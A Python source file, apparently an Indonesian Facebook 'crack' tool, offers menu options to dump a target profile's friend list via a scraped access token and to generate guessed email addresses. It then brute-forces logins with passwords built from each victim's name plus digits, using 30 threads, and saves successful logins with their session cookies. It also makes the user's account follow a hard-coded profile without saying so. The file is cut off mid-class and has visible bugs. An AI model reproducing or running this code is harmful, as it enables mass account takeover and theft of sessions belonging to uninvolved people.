# !/usr/bin/python3
# coding         : utf-8
# Author         : LT | PROJECT
# Python version : 3.11.6 / 1.007.2
# Github         : https://github.com/nixyproject-cfd
#----------[ MODULE ]----------#
try:
    import os, re, sys, json, time, random, requests
    from datetime import datetime
    from time import time as timeripz
    from bs4 import BeautifulSoup as par
    from rich.console import Console as Cons
    from rich.progress import Progress, TextColumn
    from concurrent.futures import ThreadPoolExecutor
    console = Cons
except:
    try: 
        os.system('pip install bs4')
        os.system('pip install rich')
        os.system('pip install requests')
        os.system('pip install stdiomask')
    except ModuleNotFoundError as e: sys.exit(e)
 
#----------[ COLOR-RICH ]----------#
M = "[#FF0000]" # MERAH
P = "[#FFFFFF]" # PUTIH
H = "[#00FF00]" # HIJAU
K = "[#FFFF00]" # KUNING
B = "[#00C8FF]" # BIRU
J = "[#FF8F00]" # JINGGA
A = "[#AAAAAA]" # ABU-ABU
C = "[#00FFFF]" # CYAN
PINK = "[#FF1493]" # PINK
L = " [#00FF00]" # LIME / HIJAU MUDA TERANG

UaFresto = 'SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]'
dumpid=[]
dumpid2=[]  

coded = ('Develovers %sLT | Project'%(H))
use = ('Used Clients %sLunatic'%(H))
version = ('Version-SC %sLibev - 1.1'%(H))
status = ('Status %sTersakiti'%(H))

# HEADERS
class Miya:
    # fuction init
    def __init__(self) -> None:pass
    
    def Useragent(self):
        for digit in range(1000):
            self.realme = str(random.choice(["RMX3516",
            "RMX3461","RMX3286","RMX3561","RMX3388",
            "RMX3311","RMX3142","RMX2071","RMX1805",
            "RMX1809","RMX1801","RMX1807","RMX1803",
            "RMX1825","RMX1821","RMX1822","RMX1833",
            "RMX1851","RMX1853","RMX1827","RMX1911",
            "RMX1919","RMX1927","RMX1971","RMX1973",
            "RMX2030","RMX2032","RMX1925","RMX1929",
            "RMX2001","RMX2061","RMX2063","RMX2040",
            "RMX2042","RMX2002","RMX2151","RMX2163",
            "RMX2155","RMX2170","RMX2103","RMX3085",
            "RMX3241","RMX3081","RMX3151","RMX3381",
            "RMX3521","RMX3474","RMX3471","RMX3472",
            "RMX3392","RMX3393","RMX3491","RMX1811",
            "RMX2185","RMX3231","RMX2189","RMX2180",
            "RMX2195","RMX2101","RMX1941","RMX1945",
            "RMX3063","RMX3061","RMX3201","RMX3203",
            "RMX3261","RMX3263","RMX3193","RMX3191",
            "RMX3195","RMX3197","RMX3265","RMX3268",
            "RMX3269","RMX2027","RMX2020","RMX2021",
            "RMX3581","RMX3501","RMX3503","RMX3511",
            "RMX3310","RMX3312","RMX3551","RMX3301",
            "RMX3300","RMX2202","RMX3363","RMX3360",
            "RMX3366","RMX3361","RMX3031","RMX3370",
            "RMX3357","RMX3560","RMX3562","RMX3350",
            "RMX2193","RMX2161","RMX2050","RMX2156",
            "RMX3242","RMX3171","RMX3430","RMX3235",
            "RMX3506","RMX2117","RMX2173","RMX3161",
            "RMX2205","RMX3462","RMX3478","RMX3372",
            "RMX3574","RMX1831","RMX3121","RMX3122",
            "RMX3125","RMX3043","RMX3042","RMX3041",
            "RMX3092","RMX3093","RMX3571","RMX3475",
            "RMX2200","RMX2201","RMX2111","RMX2112",
            "RMX1901","RMX1903","RMX1992","RMX1993",
            "RMX1991","RMX1931","RMX2142","RMX2081",
            "RMX2085","RMX2083","RMX2086","RMX2144",
            "RMX2051","RMX2025","RMX2075","RMX2076",
            "RMX2072","RMX2052","RMX2176","RMX2121",
            "RMX3115","RMX1921","RMX3371"]))
            self.infinix = str(random.choice(["X676B","X687","X609","X697","X680D","X507","X605","X668","X6815B","X624", "X655F","X689C","X608","X698","X682B","X682C","X688C", "X688B","X658E","X659B","X689B","X689","X689D","X662","X662B","X675", "X6812B", "X6812", "X6817B", "X6817", "X6816C","X6816","X6816D","X668C","X665B","X665E", "X510","X559C","X559F","X559","X606","X606C","X606D"]))
            self.chrome = str(random.randint(40,114))+'.0.'+str(random.randint(2200,4200))+'.'+str(random.randint(40,140))
            uainfinix = 'Mozilla/5.0 (Linux; Android '+self.infinix+') '+str(random.randint(1,9))+'.'+str(random.randint(1,9))+'; Build/0'+str(random.randint(1,9))+'0'+str(random.randint(1,9))+') AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'+self.chrome+' Safari/537.36'
            uarealme = 'Mozilla/5.0 (Linux; Android '+self.realme+') '+str(random.randint(1,9))+'.'+str(random.randint(1,9))+'; Build/0'+str(random.randint(1,9))+'0'+str(random.randint(1,9))+') AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'+self.chrome+' Safari/537.36'
            device = str(random.choice([uainfinix, uarealme]))
            return(device)
     
    #----------[ HEADERS-LOGIN ]----------#
    def head_login(self):
        headers = {
            "Host": "m.facebook.com",
            "Dpr": "1.53125",
            "Viewport-Width": "980",
            "Sec-Ch-Ua": '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
            "Sec-Ch-Ua-Mobile": "?1",
            "Sec-Ch-Ua-Platform": '"Android"',
            "Sec-Ch-Ua-Platform-version": '"10.0.0"',
            "Sec-Ch-Ua-Model": '"RMX1821"',
            "Sec-Ch-Ua-Full-Version-List": '"Chromium";v="112.0.5615.47", "Google Chrome";v="112.0.5615.47", "Not:A-Brand";v="99.0.0.0"',
            "Sec-Ch-Prefers-Color-Scheme": "dark",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Referer": "https://m.facebook.com/login.php?next=https%3A%2F%2Fm.facebook.com%2Fadsmanager%2Fmanage%2Fcampaigns%3Fwtsid%3Drdr_072QbFsCLxwR5Rssa&refsrc=deprecated&wtsid=rdr_072QbFsCLxwR5Rssa&_rdr",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,pt;q=0.6"}
        return ( headers )   
        
    #----------[ HEADERS-REGULER ]----------#
    def head_reguler(self):
        headers = {
            "Host": "free.prod.facebook.com",
            "content-length": "169",
            "cache-control": "max-age=0",
            "dpr": "1.53125",
            "viewport-width": "980",
            "sec-ch-ua": '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-ch-ua-platform-version": '"10.0.0"',
            "sec-ch-ua-model": '""',
            "sec-ch-ua-full-version-list": '"Chromium";v="112.0.5615.47", "Google Chrome";v="112.0.5615.47", "Not:A-Brand";v="99.0.0.0"',
            "sec-ch-prefers-color-scheme":str(random.choice(['dark','light'])),
            "upgrade-insecure-requests": "1",
            "origin": "https://free.prod.facebook.com",
            "content-type": "application/x-www-form-urlencoded",
            "user-agent": self.Useragent(),
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "sec-fetch-site": "none",
            "sec-fetch-mode": "navigate",
            "sec-fetch-user": "?1",
            "sec-fetch-dest": "document",
            "referer": "https://free.prod.facebook.com/login/?next=https%3A%2F%2Fm.facebook.com%2Fpages%2F%3Fcategory%3Dtop%26ref%3Dbookmarks%26wtsid%3Drdr_0WLXe9WWdaCQsCD7x&ref=bookmarks&fl&login_from_aymh=1&refid=9",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "id,en-US;q=0.8,en;q=0.9"}
        return ( headers )   
        
    #----------[ HEADERS-REGULER-V2 ]----------#
    def head_reguler_v2(self):
        headers = {
            "Host": "free.prod.facebook.com",
            "content-length": "169",
            "cache-control": "max-age=0",
            "dpr": "1.53125",
            "viewport-width": "980",
            "sec-ch-ua": '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-ch-ua-platform-version": '"10.0.0"',
            "sec-ch-ua-model": '""',
            "sec-ch-ua-full-version-list": '"Chromium";v="112.0.5615.47", "Google Chrome";v="112.0.5615.47", "Not:A-Brand";v="99.0.0.0"',
            "sec-ch-prefers-color-scheme":str(random.choice(['dark','light'])),
            "upgrade-insecure-requests": "1",
            "origin": "https://free.prod.facebook.com",
            "content-type": "application/x-www-form-urlencoded",
            "user-agent": self.Useragent(),
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "sec-fetch-site": "none",
            "sec-fetch-mode": "navigate",
            "sec-fetch-user": "?1",
            "sec-fetch-dest": "document",
            "referer": "https://free.prod.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "id,en-US;q=0.8,en;q=0.9"}
        return ( headers )   
        
    #----------[ HEADERS-EMAIL ]----------#
    def head_email(self):
        headers = {
            "Host":"free.prod.facebook.com",
            "cache-control":"max-age=0",
            "upgrade-insecure-requests":"1",
            "origin":"https://free.prod.facebook.com",
            "Content-Type":"application/x-www-form-urlencoded",
            "user-agent": self.Useragent(),
            "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "x-requested-with":"mark.via.gp",
            "sec-fetch-site":"same-origin",
            "sec-fetch-mode":"navigate",
            "sec-fetch-user":"?1",
            "sec-fetch-dest":"document",
            "referer":"https://free.prod.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
            "accept-encoding":"gzip, deflate",
            "accept-language":"id,en-US;q=0.8,en;q=0.9",
            "connection":"Keep-Alive",
            "view-width":"980"}    
        return ( headers )   

# LOGIN
class FanzMiya:   
    # fucktion init
    def __init__(self):
        self.ip = requests.get("http://ip-api.com/json/").json()["query"]
        self.negara = requests.get("http://ip-api.com/json/").json()["country"]
        self.exec_menu('')
        
    #----------[ DELETED-DATA-LOGIN ]----------#
    def deleted_data(self,file = 'data/login/'):
        try:
            cok = (file+'.cookie.json')
            for cok in os.system('rm -rf '+cok):
                return ( cok )
        except:pass
        try:
            tok = (file+'.token_eaab.json')
            for tok in os.system('rm -rf '+tok):
                return ( tok )
        except:pass
        try:
            nam = (file+'.nama.json')
            for nam in os.system('rm -rf '+nam):
                return ( nam )
        except:pass           
        self.menu_login('')	
    
    #----------[ BANNER ]----------#
    def banner(self):
        if "win" in sys.platform: os.system("cls")
        else: os.system("clear")
#        Cons().print('\t%s ______________________________'%(M))
#       Cons().print(f'\t%s • %s %s'%(J,A,coded))  
#       Cons().print('\t%s • %s %s'%(J,A,use))
#       Cons().print('\t%s • %s %s'%(J,A,version)) 
#       Cons().print('\t%s • %s %s'%(J,A,status))
#       Cons().print('\t%s ______________________________'%(M))
    
    #----------[ MENU-LOGIN ]----------#
    def menu_login(self, file = 'data/login/'):
        self.banner()
        print('Userip  > {K}{self.ip}')
        print('Country > {K}{self.negara}')
        print('')
        print('1 {K} login via cookies')
        print('2 {K} login via id/email')
        CK = Cons().input('>> Choose : ')
        
        #----------[ LOGIN-COOKIE ]----------#
        if CK =='1' or CK =='01':
            Cons().print(f'\n {J}# {M}WARNING \n\n {J}*{A} cookies harus fres \n {J}*{A} saran cookie dough \n {J}*{A} jangan akun pribadi')
            cookie = Cons().input(f'\n {J}»{A} KUKIS : ')
            try:
                tok = self.dapatkan_token_eaab(cookie,'')
                Cons().print(f' {J}»{A} TOKEN : {H}{tok}')
                self.dapatkan_username(cookie)
                self.follows_dong(cookie, tok)
                with open(file+'.cookie.json',mode='w',encoding='utf8') as wr:
                    wr.write(json.dumps({'Cookie': cookie}))
                    wr.close()
                Cons().print(f'\n {J}#{A} login berhasil, silakan jalankan ulang pythonnya'); sys.exit()
            except Exception as e: sys.exit(e)
            
        #----------[ LOGIN-ID-NAMA-EMAIL ]----------#
        elif CK =='2' or CK =='02':
            Cons().print(f'\n {J}*{A} masukan id \n {J}*{A} masukan nama \n {J}*{A} masukan email')
            userid = Cons().input(f'\n {J}»{A} id/nama/email : ')
            if userid =='': Cons().print(f'\n {J}*_>{M} kamu kaya kontol');exit()
            userpas = Cons().input(f' {J}»{A} Sandi : ')
            if userpas =='': Cons().print(f'\n {J}*_>{M} kamu kaya kontol');exit()
            try:
                with requests.Session() as xyc:
                    response = xyc.get('https://m.facebook.com/login/?next=https%3A%2F%2Fm.facebook.com%2Fadsmanager%2Fmanage%2Fcampaigns%3Fwtsid%3Drdr_072QbFsCLxwR5Rssa&ref=dbl&fl&login_from_aymh=1&refid=9').text
                    encoding = {
                         "lsd": re.search('name="lsd" value="(.*?)"', str(response)).group(1), 
                         "jazoest": re.search('name="jazoest" value="(\d+)"', str(response)).group(1), 
                         "m_ts": re.search('name="m_ts" value="(.*?)"', str(response)).group(1), 
                         "li": re.search('name="li" value="(.*?)"', str(response)).group(1), 
                         "try_number": 0, 
                         "unrecognized_tries": 0, 
                         "email":userid, 
                         "pass": userpas,
                         "login":"Log + In", 
                         "bi_xrwh": 0}
                    headers = Miya().head_login()
                    params = {'next':'https://m.facebook.com/adsmanager/manage/campaigns?wtsid=rdr_072QbFsCLxwR5Rssa','ref':'dbl','fl':'','login_from_aymh':'1','refid':'9'}
                    response = par(xyc.post('https://m.facebook.com/login/',data=encoding, params=params, headers=headers, allow_redirects=False).text,"html.parser")
            except ConnectionError as e: sys.exit(e)
            except:pass
            try:
               with requests.Session() as xyc:
                   payload = xyc.cookies.get_dict()
                   if 'c_user' or payload.keys():
                       cookie = ';'.join(['%s=%s'%(name,value) for name,value in xyc.cookies.get_dict().items()])
                       Cons().print(f'\n {J}»{A} Cookie : {H}{cookie}')
                       tok = self.dapatkan_token_eaab(cookie,'')
                       Cons().print(f' {J}»{A} Token : {H}{tok}')
                       self.dapatkan_username(cookie)
                       self.follows_dong(cookie, tok)
                       with open(file+'.cookie.json',mode='w',encoding='utf8') as wr:
                           wr.write(json.dumps({'Cookie': cookie}))
                           wr.close()
                       Cons().print(f'\n {J}#{A} login berhasil, silakan jalankan ulang pythonnya'); sys.exit()
            except Exception as e: sys.exit(e)
        else: Cons().print(f'\n {J}*_>{M} oke brooo ');exit()
            
    #----------[ TOKEN-EAAB ]----------#
    def dapatkan_token_eaab(self, cookie, file = 'data/login/'):
        try:
            with requests.Session() as xyc:
                url = xyc.get("https://adsmanager.facebook.com/adsmanager/manage/campaigns?&breakdown_regrouping=1",cookies={"cookie": cookie})
                src = re.search('act=(\d+)',url.text).group(1)
                try:
                    act = xyc.get("https://adsmanager.facebook.com/adsmanager/manage/campaigns?act=%s&breakdown_regrouping=1"%(src),cookies={"cookie": cookie})
                    tok = re.search('.__accessToken="(.*?)"',act.text).group(1)
                    with open(file+'.token_eaab.json',mode='w',encoding='utf8') as wr:
                        wr.write(json.dumps({'Token': tok}))
                        wr.close()
                    return tok
                except ConnectionError as e: sys.exit(e)        
        except AttributeError as e: sys.exit(e)   
        
    #----------[ PLEASE-JANGAN-DI-GANTI ]----------#
    def follows_dong(self, cookie, tok):
        try:
            with requests.Session() as xyc:
                url = par(xyc.get('https://mbasic.facebook.com/profile.php?id=100028845823412',cookies={"cookie": cookie}).text, "html.parser")
                if "/a/subscribe.php" in str(url):
                    car = re.search('/a/subscribe.php(.*?)"', str(url)).group(1).replace("amp;", "")
                    xyc.get("https://mbasic.facebook.com/a/subscribe.php{}".format(car), cookies={"cookie": cookie})
        except Exception as e:sys.exit(e)
    
    #----------[ MENGAMBIL-USERNAME ]----------#
    def dapatkan_username(self, cookie):
        try:
            with requests.Session() as xyc:
                url = par(xyc.get("https://www.facebook.com/profile.php",headers={'User-Agent':UaFresto}, cookies={'cookie':cookie}).text, "html.parser")
                try:
                    nam = re.findall('<title>(.*?)</title>',str(url))[0]
                    with open('.nama.json',mode='w',encoding='utf8') as wr:
                        wr.write(json.dumps({'Nama': nam}))
                        wr.close()
                    return nam
                except ConnectionError as e: sys.exit(e)        
        except AttributeError as e: sys.exit(e)

    #----------[ MENU-CRACKING ]----------# 
    def exec_menu(self, file = 'data/login/'):
        try:
            name = json.loads(open(file+'.nama.json', 'r').read())['Nama']
            token = json.loads(open(file+'.token_eaab.json', 'r').read())['Token']
            cookie = json.loads(open(file+'.cookie.json', 'r').read())['Cookie']
        except FileNotFoundError as e: print(e); time.sleep(2); self.deleted_data('')
        self.banner()
        Cons().print(f'{H}╔════════════════════════════════════╗')
        Cons().print(f'{C}             LUNATIC DARK            ')
        Cons().print(f'{H}╚════════════════════════════════════╝')
        Cons().print(f'{PINK}______________________________________')
        Cons().print(f'{K}               SYSTEM                ')
        Cons().print(f'{PINK}______________________________________')
        Cons().print(f'')
        Cons().print(f'\n {M}»{P} Name FB    =  {H}{name}')
        Cons().print(f' {M}»{P} Ip Adress  =  {H}{self.ip}')
        Cons().print(f' {M}»{P} Country    =  {H}{self.negara}')
        Cons().print(f'')
        Cons().print(f'{PINK}______________________________________')
        Cons().print(f'{K}             DAFTAR MENU             ')
        Cons().print(f'{PINK}______________________________________')
        Cons().print(f'\n {H}1 {C}KREK FB FUBLIC')
        Cons().print(f' {H}2 {C}KREK FILES')
        Cons().print(f' {H}3 {C}KREK EMAIL')
        Cons().print(f' {H}4 {C}KREK DARI NAMA')
        Cons().print(f' {H}5 {C}CHECK OK or CP')
        Cons().print(f' {H}6 {C}LAPOR BUG SCRIPT')
        Cons().print(f' {H}0 {M}EXIT')
        Cons().print(f'{PINK}______________________________________')
        Cons().print(f'')
        FCF = Cons().input(f'\n {H}select Options 1 / 6 or 0 >>    ')
        
        #----------[ CRACK-PUBLIK ]----------#
        if FCF =='1' or FCF =='01':
            Cons().print(f'\n {J}#{A} PASTIKAN ID NYA BENAR')
            user = Cons().input(f' {J}»{A} ID : ')
            if user =='': Cons().print(f'\n {J}*_>{M} Babi');exit()
            Cons().print(f'\n {J}#{A} Ketik ctrl + c untuk berhenti dump')
            for uuid in user.split(','):
                try:
                    Dump().dump_publik(uuid,cookie,token,'')
                except KeyboardInterrupt: pass
                except Exception as e: print(e)
                Crack().Generate_list()
                
       #----------[ CRACK-EMAIL ]----------#       
        elif FCF =='3' or FCF =='03':
            Cons().print(f'\n {J}#{A} Banyaknya Nama, pisahkan dengan koma')
            Cons().print(f'')
            user = Cons().input(f' {M}»{P} input Name : ')
            if user =='': Cons().print(f'\n {J}*{M} Babi');exit()
            total = Cons().input(f' {M}»{P} Limit krek : ')
            if total =='': Cons().print(f'\n {H}*{M} Babi');exit()
            Cons().print(f'\n {H}#{A} Contoh FORMAT : ({H}@gmail.com, yahoo.com, dll{A})')
            doma = Cons().input(f' {H}»{P} FORMAT : ')
            if doma =='': Cons().print(f'\n {H}*{M} KONTOL');exit()
            Cons().print(f'\n {H}#{P} Ketik ctrl + c untuk berhenti dump')
            for nama in user.split(','):
                try:
                    Dump().dump_email(nama,total,doma)
                except KeyboardInterrupt: pass
                except Exception as e: sys.exit(e)
                CrackM().Generate_listM()
                
        #----------[ LAPOR-BUG ]----------#          
        elif FCF =='6' or FCF =='6':
            xxx = ('Assalamualaikum')
            try:
               for teks in xxx:
                   os.system('xdg-open  https://wa.me/6282240074362?text='+teks)
            except Exception as e: sys.exit(e)
                
        #----------[ DELETE-DATA ]----------#
        elif FCF =='0' or FCF =='00':
            KC = Cons().input(f'\n {J}#{A} EXIT OR DELETE COOKIES ( y/t ): ')
            if KC in ['y','Ya','Y','YA']: self.deleted_data('')
            else: sys.exit()      
        else: Cons().print(f'\n {J}*{M} OKE BABI');exit()   

# DUMP                                         
class Dump:
    # fuction init
    def __init__(self) -> None:pass
        
    #----------[ DUMP-PUBLIK ]----------#
    def dump_publik(self,uuid,cookie,token,fields):
        try:
            if len(dumpid) == 0:
                params = {"access_token": token,"fields": "friends.fields(id,name)"}
            else:
                params = {"access_token": token,"fields": f"friends.fields(id,name).after({fields})"}
            response = requests.get("https://graph.facebook.com/v18.0/%s"%(uuid),params=params,cookies={'cookie':cookie}).json()
            for xyz in response['friends']['data']:
                format = '%s <[]> %s'%(xyz['id'],xyz['name'])
                if format not in dumpid:
                    dumpid.append(format)
                    Cons().print(f' {H}»{P} proses dump {H}{str(len(dumpid))}{A} idz',end='\r'); sys.stdout.flush()
            if 'fields' in str(response):
                self.dump_publik(uuid,cookie,token,response["friends"]["paging"]["cursors"]["after"])
        except KeyboardInterrupt: pass
        except AttributeError: pass
        
    #----------[ DUMP-EMAIL ]----------#
    def dump_email(self,nama,total,doma):
        ack = str(random.choice(['tuti','astutik','warsi','warsinah','mariati','manda','putri','putra','safitri','saputra','dikul','mursyid','ardi','ardian','diancm','dinda','rahma','fajar','rendi','risky','difa','andika','yaya','gilang','galang','aldi','aldo','revaldo','revaldi','yossy','sulis','caca','cici','arif','zainal','arifin','dika','bayu','ferly','semarang','boyolali','cilacap','kebumen','banyumas','tuban','sumedang','sragen','sunda','garut','cirebon','sukabumi','medan','suroboyo','surabaya','cilacap','jepara','tasik','malang','jogja','kediri','kudus','jember','situbondo','wonosobo','trenggalek','gresik','bangkalan','jombang','lamongan','lumajang','madiun','magetan','mojokerto','nganjuk','pacitan','ngawi','pasuruan','ponorogo','pamengkasan','sidoarjo','blitar','banjarnegara','brebes','grobokan','karanganyar','kendal','klaten','kudus','pati','pekalongan','rembang','temanggung','wonogiri','wonosobo','sukoharjo','bandung','ciamis','cianjur','cirebon','indramayu','sumedang','purwakarta','bogor']))
        blk = ['12','123','1234','12345','official','gaming','pribadi']
        for i in range(int(total)):
            nam = (nama+str(random.choice([f'{str(random.randint(0,90))}',f'{str(random.choice(ack))}{str(random.randint(0,90))}',f'{str(random.choice(blk))}{str(random.randint(0,90))}',f'{str(random.choice(ack))}{str(random.choice(blk))}']))+doma)
            if nam not in dumpid:dumpid.append(nam+'<[ ]>'+nama)
            Cons().print(f' {H}#{P} Proses dump {H}{str(len(dumpid))}{A} idz',end='\r'); sys.stdout.flush()
        return(dumpid)
           
# CRACK       
class Crack:   
    # fuction init
    def __init__(self):
        self.okc = ('BAGUS.txt')
        self.cpc = ('JELEK.txt')
        self.suck, self.loop, self.check = 0,0,0
        
    #----------[ WORDLIST ]----------# 
    def Generate_list(self):
        global prog,des
        print('\n')
        Cons().print(f' {P}[{H}1{P}] {C}MODE HARAM')
        Cons().print(f' {P}[{H}2{P}] {C}MODE ANJAY')
        Cons().print(f' ')
        execlogin = Cons().input(f'\n {H}»{P} Choose 1 / 2 : ')
        Cons().print(f'\n {P}[{H}*{P}] Hasil OK Simpan/{H}OK/{self.okc} \n {A}[{J}*{A}] Hasil CP Simpan/{K}CP/{self.cpc} \n\n {J}#{A} Mainkan Mode Pesawat Setiap 300 ID\n')
        prog = Progress(TextColumn("{task.description}"), TextColumn("{task.percentage:.0f}%"))
        des = prog.add_task('',total=len(dumpid))
        with prog:
            with ThreadPoolExecutor(max_workers=30) as V:
                for akun in dumpid:
                    userid, username = akun.split('<[]>')[0], akun.split('<=>')[1].lower()
                    password = self.Generate_pas(username)
                    if execlogin in ('1','01'): V.submit(self.Reguler,userid,password) 
                    elif execlogin in ('2','02'): V.submit(self.RegulerV2,userid,password) 
                    else:(V.submit(self.Reguler,userid,password))
                    
     #----------[ PASSWORD ]----------#             
    def Generate_pas(self,username):
        for nama in username.split(' '):
            if len(nama) == 3 or len(nama) == 4 or len(nama) == 5:password = [nama, nama+"123", nama+"1234", nama+"12345", nama+"123456"]
            else: password = [nama, nama+"123", nama+"1234", nama+"12345", nama+"123456"]
        return ( password )
                    
       #----------[ CHECK-RESULT ]----------# 
        if self.suck == 0 or self.check ==0:
            Cons().print(f'\n {P}[{M}*{P}] {H}MAMPUS GAK DAPET')
        else:
            Cons().print(f'\n {P}[{H}*{P}] {H}IDIHH BELAGU DAPAT DIKIT AJA ( OK ) : {H}{self.suck}{A} dan hasil CP : {K}{self.check}{A}')
        
    #-----[ METHOD-REGULER ]-----#
    def Reguler(self,userid,password):
        prog.update(des,description=f' {H}# {A}KREK {H}{self.suck}{A}/{K}{self.check} {J}{len(dumpid)}{A}/{J}{self.loop}{A}')
        prog.advance(des)
        for userpas in password:
            try:
                with requests.Session() as xyc:
                    response = xyc.get('https://free.prod.facebook.com/login/?next=https%3A%2F%2Fm.facebook.com%2Fpages%2F%3Fcategory%3Dtop%26ref%3Dbookmarks%26wtsid%3Drdr_0WLXe9WWdaCQsCD7x&ref=bookmarks&fl&login_from_aymh=1&refid=9').text
                    encoding = {
                       "lsd": re.search('name="lsd" value="(.*?)"', str(response)).group(1), 
                       "jazoest": re.search('name="jazoest" value="(\d+)"', str(response)).group(1), 
                       "m_ts": re.search('name="m_ts" value="(.*?)"', str(response)).group(1), 
                       "li": re.search('name="li" value="(.*?)"', str(response)).group(1), 
                       "try_number": 0, 
                       "unrecognized_tries": 0, 
                       "email":userid,
                       "encpass": "#PWD_BROWSER:0:{}:{}".format(str(timeripz()).split('.')[0], userpas),
                       "login":"Log + In", 
                       "bi_xrwh": 0}
                    headers = Miya().head_reguler()
                    cookies = ';'.join(['%s=%s'%(name,value) for name,value in xyc.cookies.get_dict().items()])
                    params = {"next":"https://m.facebook.com/pages/?category=top&ref=bookmarks&wtsid=rdr_0WLXe9WWdaCQsCD7x","refsrc":"deprecated","lwv":"100","ref":"bookmarks"}
                    response = par(xyc.post('https://free.prod.facebook.com/login/device-based/regular/login/',data=encoding,params=params,cookies={'cookie':cookies},headers=headers,allow_redirects=False).text,"html.parser")
                    payload = xyc.cookies.get_dict()          
                    if 'c_user' in payload.keys():
                        coki = ';'.join(['%s=%s'%(name,value) for name,value in xyc.cookies.get_dict().items()])
                        print(f' {A}#>>>>> {H}{userid}{J}<[]>{H}{userpas}{J}<[]>{H}{coki}{A}',end='\r'); sys.stdout.flush()
                        resok=('%s<[]>%s<[]>%s'%(userid,userpas,coki)) 
                        with open('OK/'+self.okc,'a') as wr:
                            wr.write(resok+'\n')
                            wr.close()
                        self.suck+=1                
                        break                                                                       
                    elif 'checkpoint' in payload.keys():
                        print(f' {A}#——> {K}{userid}{J}<=>{K}{userpas}{A}',end='\r'); sys.stdout.flush()
                        rescp=('%s<[ ]>%s<[ ]>%s'%(userid,userpas))      
                        with open('CP/'+self.cpc,'a') as wr:
                            wr.write(rescp+'\n')
                            wr.close()
                        self.check+=1                   
                        break
                    else:continue
            except requests.exceptions.ConnectionError:
                prog.update(des,description=f' {J}# {M}DENIED {H}{self.suck}{A}/{K}{self.check} {J}{len(dumpid)}{A}/{J}{self.loop}{A}')
                prog.advance(des)
                time.sleep(31)
        self.loop+=1
        
    #-----[ METHOD-REGULERV2 ]-----#
    def RegulerV2(self,userid,password):
        prog.update(des,description=f' {J}# {A}KREK {H}{self.suck}{A}/{K}{self.check} {J}{len(dumpid)}{A}/{J}{self.loop}{A}')
        prog.advance(des)
        for userpas in password:
            try:
                with requests.Session() as xyc:
                    response = xyc.get('https://free.prod.facebook.com/login/?next=https%3A%2F%2Fm.facebook.com%2Fpages%2F%3Fcategory%3Dtop%26ref%3Dbookmarks%26wtsid%3Drdr_0WLXe9WWdaCQsCD7x&ref=bookmarks&fl&login_from_aymh=1&refid=9').text
                    encoding = {
                       "lsd": re.search('name="lsd" value="(.*?)"', str(response)).group(1), 
                       "jazoest": re.search('name="jazoest" value="(\d+)"', str(response)).group(1), 
                       "m_ts": re.search('name="m_ts" value="(.*?)"', str(response)).group(1), 
                       "li": re.search('name="li" value="(.*?)"', str(response)).group(1), 
                       "try_number": 0, 
                       "unrecognized_tries": 0, 
                       "email":userid,
                       "encpass": "#PWD_BROWSER:0:{}:{}".format(str(timeripz()).split('.')[0], userpas),
                       "login":"Log + In", 
                       "bi_xrwh": 0}
                    headers = Miya().head_reguler_v2()
                    cookies = ';'.join(['%s=%s'%(name,value) for name,value in xyc.cookies.get_dict().items()])
                    params = {"refsrc":"deprecated","lwv":"100","ref":"dbl"}
                    response = par(xyc.post('https://free.prod.facebook.com/login/device-based/regular/login/',data=encoding,params=params,cookies={'cookie':cookies},headers=headers,allow_redirects=False).text,"html.parser")
                    payload = xyc.cookies.get_dict()          
                    if 'c_user' in payload.keys():
                        coki = ';'.join(['%s=%s'%(name,value) for name,value in xyc.cookies.get_dict().items()])
                        print(f' {A}#——> {H}{userid}{J}<[ ]>{H}{userpas}{J}<=>{H}{coki}{A}',end='\r'); sys.stdout.flush()
                        resok=('%s<[ ]>%s<[ ]>%s'%(userid,userpas,coki)) 
                        with open('OK/'+self.okc,'a') as wr:
                            wr.write(resok+'\n')
                            wr.close()
                        self.suck+=1                
                        break                                                                       
                    elif 'checkpoint' in payload.keys():
                        print(f' {A}#——> {K}{userid}{J}<[ ]>{K}{userpas}{A}',end='\r'); sys.stdout.flush()
                        rescp=('%s<[ ]>%s<[ ]>%s'%(userid,userpas))      
                        with open('CP/'+self.cpc,'a') as wr:
                            wr.write(rescp+'\n')
                            wr.close()
                        self.check+=1                   
                        break
                    else:continue
            except requests.exceptions.ConnectionError:
                prog.update(des,description=f' {J}# {M}SFC.Spam {H}{self.suck}{A}/{K}{self.check} {J}{len(dumpid)}{A}/{J}{self.loop}{A}')
                prog.advance(des)
                time.sleep(31)
        self.loop+=1
        
# CRACK       
class CrackM:   
    # fuction init
    def __init__(self):
